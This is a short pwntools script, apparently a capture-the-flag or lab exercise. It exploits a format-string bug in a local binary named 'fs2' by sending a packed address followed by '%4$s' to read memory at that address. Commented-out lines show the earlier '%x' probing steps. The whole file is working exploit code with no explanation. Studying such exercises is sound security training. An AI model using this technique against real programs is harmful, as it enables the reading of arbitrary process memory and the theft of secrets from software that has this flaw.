from pwn import *

context.log_level = "debug"

string_addr = 0x56558008

p = process('./fs2')
# p.sendline('ABCD.%x.%x.%x.%x.%x.%x')
# p.sendline('ABCD.%4$x')
# p.sendline(p32(string_addr)+b'.%4$x')
p.sendline(p32(string_addr)+b'.%4$s')

p.recvall()
